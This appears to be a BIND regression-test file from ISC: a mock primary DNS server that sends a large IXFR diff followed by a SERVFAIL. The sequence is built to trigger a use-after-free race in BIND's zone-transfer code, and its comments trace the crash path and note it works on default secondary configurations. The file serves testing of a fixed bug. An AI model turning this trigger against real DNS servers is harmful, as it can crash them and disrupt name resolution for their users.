"""
Copyright (C) Internet Systems Consortium, Inc. ("ISC")

SPDX-License-Identifier: MPL-2.0

This Source Code Form is subject to the terms of the Mozilla Public
License, v. 2.0.  If a copy of the MPL was not distributed with this
file, you can obtain one at https://mozilla.org/MPL/2.0/.

See the COPYRIGHT file distributed with this work for additional
information regarding copyright ownership.
"""

from collections.abc import AsyncGenerator

import struct

import dns.flags
import dns.rcode
import dns.rdatatype

from isctest.asyncserver import (
    AsyncDnsServer,
    BytesResponseSend,
    DnsProtocol,
    DnsResponseSend,
    QueryContext,
    ResponseAction,
    ResponseHandler,
)

# DNS constants used by raw wire builder functions below
DNS_TYPE_SOA = 6
DNS_TYPE_A = 1
DNS_TYPE_NS = 2
DNS_TYPE_AXFR = 252
DNS_TYPE_IXFR = 251
DNS_CLASS_IN = 1
DNS_FLAG_QR = 0x8000
DNS_FLAG_AA = 0x0400
DNS_RCODE_NOERROR = 0
DNS_RCODE_SERVFAIL = 2

ZONE_NAME = "ixfr-race."
NUM_RECORDS = 400


def encode_name(name):
    """Encode a DNS name in wire format (no compression)."""
    parts = name.rstrip(".").split(".")
    result = b""
    for part in parts:
        encoded = part.encode("ascii")
        result += struct.pack("B", len(encoded)) + encoded
    result += b"\x00"
    return result


def build_soa_rdata(
    mname, rname, serial, refresh=3600, retry=900, expire=604800, minimum=86400
):
    """Build SOA record rdata."""
    rdata = encode_name(mname)
    rdata += encode_name(rname)
    rdata += struct.pack("!IIIII", serial, refresh, retry, expire, minimum)
    return rdata


def build_a_rdata(ip_str):
    """Build A record rdata from dotted-quad string."""
    parts = ip_str.split(".")
    return struct.pack("4B", *[int(p) for p in parts])


def build_rr(name_bytes, rtype, rclass, ttl, rdata):
    """Build a complete resource record."""
    rr = name_bytes
    rr += struct.pack("!HHIH", rtype, rclass, ttl, len(rdata))
    rr += rdata
    return rr


def build_dns_header(qid, flags, qdcount, ancount, nscount=0, arcount=0):
    """Build DNS message header."""
    return struct.pack("!HHHHHH", qid, flags, qdcount, ancount, nscount, arcount)


def build_ixfr_message1(qid, zone_name, num_records):
    """
    Build IXFR Message 1: A valid IXFR diff that triggers ixfr_commit().

    This message contains a complete diff 1 (large, many records) which
    triggers ixfr_commit() -> isc_work_enqueue() -> worker thread starts.

    The message ends with a boundary SOA that starts diff 2, so the state
    machine is in XFRST_IXFR_DEL waiting for more records.

    Answer section structure:
    1. Initial SOA (end_serial=3)   -- XFRST_ZONEXFRREQUEST
    2. Old SOA (serial=1)           -- XFRST_FIRSTDATA -> IXFR -> DELSOA
    3. DEL A records (num_records)  -- XFRST_IXFR_DEL (diffs++)
    4. Mid SOA (serial=2)           -- XFRST_IXFR_ADDSOA (diffs++)
    5. ADD A records (num_records)  -- XFRST_IXFR_ADD (diffs++)
    6. Boundary SOA (serial=2)      -- ixfr_commit()! Worker enqueued.
                                       Then goto redo -> DELSOA of diff 2
    """
    zone_wire = encode_name(zone_name)
    question = zone_wire + struct.pack("!HH", DNS_TYPE_IXFR, DNS_CLASS_IN)

    mname = "ns." + zone_name
    rname = "admin." + zone_name
    end_serial = 3
    old_serial = 1
    mid_serial = 2

    soa_end = build_soa_rdata(mname, rname, end_serial)
    soa_old = build_soa_rdata(mname, rname, old_serial)
    soa_mid = build_soa_rdata(mname, rname, mid_serial)

    records = []

    # 1. Initial SOA (end serial)
    records.append(build_rr(zone_wire, DNS_TYPE_SOA, DNS_CLASS_IN, 3600, soa_end))

    # 2. Old SOA (serial 1) - triggers IXFR detection
    records.append(build_rr(zone_wire, DNS_TYPE_SOA, DNS_CLASS_IN, 3600, soa_old))

    # 3. DEL A records
    for i in range(num_records):
        name = encode_name(f"host-{i}.{zone_name}")
        ip = f"10.0.{(i >> 8) & 0xFF}.{i & 0xFF}"
        records.append(
            build_rr(name, DNS_TYPE_A, DNS_CLASS_IN, 3600, build_a_rdata(ip))
        )

    # 4. Mid SOA (serial 2) - end of DEL, start of ADD
    records.append(build_rr(zone_wire, DNS_TYPE_SOA, DNS_CLASS_IN, 3600, soa_mid))

    # 5. ADD A records
    for i in range(num_records):
        name = encode_name(f"host-{i}.{zone_name}")
        ip = f"10.1.{(i >> 8) & 0xFF}.{i & 0xFF}"
        records.append(
            build_rr(name, DNS_TYPE_A, DNS_CLASS_IN, 3600, build_a_rdata(ip))
        )

    # 6. Boundary SOA (serial=2 == current_serial) -> ixfr_commit()!
    # This triggers the worker thread via isc_work_enqueue().
    # Then goto redo processes it as DELSOA of diff 2.
    records.append(build_rr(zone_wire, DNS_TYPE_SOA, DNS_CLASS_IN, 3600, soa_mid))

    ancount = len(records)
    answer = b"".join(records)
    flags = DNS_FLAG_QR | DNS_FLAG_AA | DNS_RCODE_NOERROR
    header = build_dns_header(qid, flags, 1, ancount)
    msg = header + question + answer

    return msg


def build_bad_rcode_message2(qid, zone_name):
    """
    Build Message 2

    A DNS response with rcode=SERVFAIL. When BIND receives this during an
    active IXFR transfer:

    xfrin_recv_done():
      msg->rcode != dns_rcode_noerror  (SERVFAIL != NOERROR) ->
      result = dns_result_fromrcode(msg->rcode) ->
      reqtype == dns_rdatatype_ixfr (not axfr/soa) ->
      falls through to try_axfr: ->
      xfrin_reset() -> destroys journal/version

    Meanwhile ixfr_apply worker from Message 1 is still running -> UAF.

    This works with DEFAULT secondary configuration (no special options).
    """
    zone_wire = encode_name(zone_name)
    question = zone_wire + struct.pack("!HH", DNS_TYPE_IXFR, DNS_CLASS_IN)

    flags = DNS_FLAG_QR | DNS_FLAG_AA | DNS_RCODE_SERVFAIL
    header = build_dns_header(qid, flags, 1, 0)
    msg = header + question

    return msg


def build_soa_response(qid, zone_name, serial):
    """Build a SOA response for the zone."""
    zone_wire = encode_name(zone_name)
    question = zone_wire + struct.pack("!HH", DNS_TYPE_SOA, DNS_CLASS_IN)

    mname = "ns." + zone_name
    rname = "admin." + zone_name
    soa_rdata = build_soa_rdata(mname, rname, serial)
    answer = build_rr(zone_wire, DNS_TYPE_SOA, DNS_CLASS_IN, 3600, soa_rdata)

    flags = DNS_FLAG_QR | DNS_FLAG_AA | DNS_RCODE_NOERROR
    header = build_dns_header(qid, flags, 1, 1)
    return header + question + answer


def build_axfr_response(qid, zone_name, serial, num_records):
    """
    Build a complete AXFR response for initial zone load.

    AXFR format: SOA, NS, A records, ..., SOA (trailing SOA marks end).
    """
    zone_wire = encode_name(zone_name)
    question = zone_wire + struct.pack("!HH", DNS_TYPE_AXFR, DNS_CLASS_IN)

    mname = "ns." + zone_name
    rname = "admin." + zone_name
    soa_rdata = build_soa_rdata(mname, rname, serial)

    records = []

    # Opening SOA
    records.append(build_rr(zone_wire, DNS_TYPE_SOA, DNS_CLASS_IN, 3600, soa_rdata))

    # NS record
    ns_wire = encode_name("ns." + zone_name)
    records.append(build_rr(zone_wire, DNS_TYPE_NS, DNS_CLASS_IN, 3600, ns_wire))

    # NS A record
    records.append(
        build_rr(ns_wire, DNS_TYPE_A, DNS_CLASS_IN, 3600, build_a_rdata("127.0.0.1"))
    )

    # A records (matching gen_zone.py output)
    for i in range(num_records):
        name = encode_name(f"host-{i}.{zone_name}")
        ip = f"10.0.{(i >> 8) & 0xFF}.{i & 0xFF}"
        records.append(
            build_rr(name, DNS_TYPE_A, DNS_CLASS_IN, 3600, build_a_rdata(ip))
        )

    # Trailing SOA (marks end of AXFR)
    records.append(build_rr(zone_wire, DNS_TYPE_SOA, DNS_CLASS_IN, 3600, soa_rdata))

    ancount = len(records)
    answer = b"".join(records)
    flags = DNS_FLAG_QR | DNS_FLAG_AA | DNS_RCODE_NOERROR
    header = build_dns_header(qid, flags, 1, ancount)
    msg = header + question + answer

    return msg


class IxfrRaceHandler(ResponseHandler):
    """
    Handle SOA, AXFR, and IXFR queries to trigger the IXFR->AXFR race condition.

    Phase 1: Respond to SOA with serial=1 and serve an AXFR to load the zone.
    Phase 2: After AXFR, respond to SOA with serial=3 to trigger IXFR.
             On IXFR, send a valid large diff (msg1) followed immediately by a
             SERVFAIL response (msg2) to race ixfr_commit() against xfrin_reset().
    """

    def __init__(self) -> None:
        self._axfr_done = False

    async def get_responses(
        self, qctx: QueryContext
    ) -> AsyncGenerator[ResponseAction, None]:
        qid = qctx.query.id

        if qctx.qtype == dns.rdatatype.SOA:
            serial = 3 if self._axfr_done else 1
            yield BytesResponseSend(build_soa_response(qid, ZONE_NAME, serial))

        elif qctx.qtype == dns.rdatatype.AXFR:
            yield BytesResponseSend(build_axfr_response(qid, ZONE_NAME, 1, NUM_RECORDS))
            self._axfr_done = True

        elif qctx.qtype == dns.rdatatype.IXFR:
            if qctx.protocol == DnsProtocol.UDP:
                # Force TCP retry by setting the TC bit
                qctx.response.flags |= dns.flags.TC
                yield DnsResponseSend(qctx.response)
            else:
                # Message 1: Valid IXFR diff -> triggers ixfr_commit()
                yield BytesResponseSend(
                    build_ixfr_message1(qid, ZONE_NAME, NUM_RECORDS)
                )
                # Message 2: SERVFAIL -> triggers xfrin_reset() while
                # ixfr_apply worker from Message 1 is still running -> UAF
                yield BytesResponseSend(build_bad_rcode_message2(qid, ZONE_NAME))


def main() -> None:
    server = AsyncDnsServer(default_rcode=dns.rcode.NOERROR, default_aa=True)
    server.install_response_handler(IxfrRaceHandler())
    server.run()


if __name__ == "__main__":
    main()
